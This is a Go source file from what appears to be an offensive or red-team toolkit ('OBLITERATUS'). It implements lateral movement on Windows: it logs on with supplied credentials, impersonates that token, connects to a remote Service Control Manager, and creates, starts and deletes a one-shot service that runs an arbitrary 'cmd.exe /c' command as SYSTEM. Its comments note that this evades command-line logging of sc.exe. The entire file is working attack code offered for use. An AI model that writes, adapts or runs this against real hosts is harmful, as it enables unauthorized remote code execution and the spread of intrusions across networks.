//go:build windows

package lateral

// SCM-based lateral execution (T1021.002 / T1569.002).
//
// The Service Control Manager exposes a "create + start a service" pair that
// is the classic remote-execution primitive: create a service whose binary is
// `cmd.exe /c <command>`, start it (it runs as the service's account, SYSTEM
// by default), then delete it. Output is not captured — a Windows service has
// no console — so SCMExec reports success/failure and the operator reads
// effects out of band.
//
// The connection uses the in-process SCM API (mgr.ConnectRemote) so no
// `sc.exe \\host create …` command line ever hits a child process. When
// credentials are supplied they are established with a LOGON32_LOGON_NEW_
// CREDENTIALS network logon plus impersonation, which authenticates the SMB
// session to the target without touching the operator's own logon session.

import (
	"fmt"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"
)

var (
	advapi32        = windows.NewLazySystemDLL("advapi32.dll")
	procLogonUserW  = advapi32.NewProc("LogonUserW")
	procImpersonate = advapi32.NewProc("ImpersonateLoggedOnUser")
)

const (
	logon32LogonNewCredentials = 9 // network credentials, no local profile
	logon32ProviderDefault     = 0
)

// logonUser establishes a network logon for user and returns its token.
func logonUser(user, password string) (windows.Token, error) {
	domain, name := splitUser(user)
	if name == "" {
		return 0, fmt.Errorf("scm: empty account name")
	}
	nameP, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return 0, err
	}
	domainP, err := windows.UTF16PtrFromString(domain)
	if err != nil {
		return 0, err
	}
	passP, err := windows.UTF16PtrFromString(password)
	if err != nil {
		return 0, err
	}
	var tok windows.Token
	r, _, callErr := procLogonUserW.Call(
		uintptr(unsafe.Pointer(nameP)),
		uintptr(unsafe.Pointer(domainP)),
		uintptr(unsafe.Pointer(passP)),
		uintptr(logon32LogonNewCredentials),
		uintptr(logon32ProviderDefault),
		uintptr(unsafe.Pointer(&tok)),
	)
	if r == 0 {
		return 0, fmt.Errorf("scm: LogonUser %q: %v (bad credentials or no logon right)", user, callErr)
	}
	return tok, nil
}

// SCMExec creates, starts and removes a one-shot service on the remote host
// running `cmd.exe /c command`. user may be empty to reuse the current logon
// session (domain-joined operator already authenticated to the target).
func SCMExec(host string, creds Creds, name, command string, em Emitter) error {
	host = strings.TrimSpace(host)
	if host == "" {
		return fmt.Errorf("scm: host is required")
	}
	name = sanitizeName(name)
	if name == "" {
		name = "OblSvc"
	}
	if strings.TrimSpace(command) == "" {
		return fmt.Errorf("scm: command is required")
	}

	if strings.TrimSpace(creds.User) != "" {
		tok, err := logonUser(creds.User, creds.Password)
		if err != nil {
			return err
		}
		defer tok.Close()
		r, _, callErr := procImpersonate.Call(uintptr(tok))
		if r == 0 {
			return fmt.Errorf("scm: ImpersonateLoggedOnUser: %v", callErr)
		}
		defer windows.RevertToSelf()
		emit(em, "SCM: network logon established as "+creds.User, "INFO")
	}

	m, err := mgr.ConnectRemote(host)
	if err != nil {
		return fmt.Errorf("scm: connect to \\\\%s: %w (needs admin on the target)", host, err)
	}
	defer m.Disconnect()

	emit(em, fmt.Sprintf("SCM: creating service %q on \\\\%s", name, host), "INFO")
	svc, err := m.CreateService(
		name,
		`C:\Windows\System32\cmd.exe`,
		mgr.Config{StartType: mgr.StartManual, DisplayName: "OBLITERATUS research service"},
		"/c", command,
	)
	if err != nil {
		return fmt.Errorf("scm: CreateService %q: %w", name, err)
	}
	defer svc.Close()

	if err := svc.Start(); err != nil {
		_ = svc.Delete()
		return fmt.Errorf("scm: StartService %q: %w", name, err)
	}
	emit(em, "SCM: service started (runs as SYSTEM) — waiting for it to complete", "INFO")

	// Give cmd.exe time to run before the service is torn down.
	time.Sleep(3 * time.Second)

	if err := svc.Delete(); err != nil {
		return fmt.Errorf("scm: service started but DeleteService %q failed: %w (remove it manually)", name, err)
	}
	emit(em, "SCM: service removed on \\\\"+host, "SUCCESS")
	return nil
}
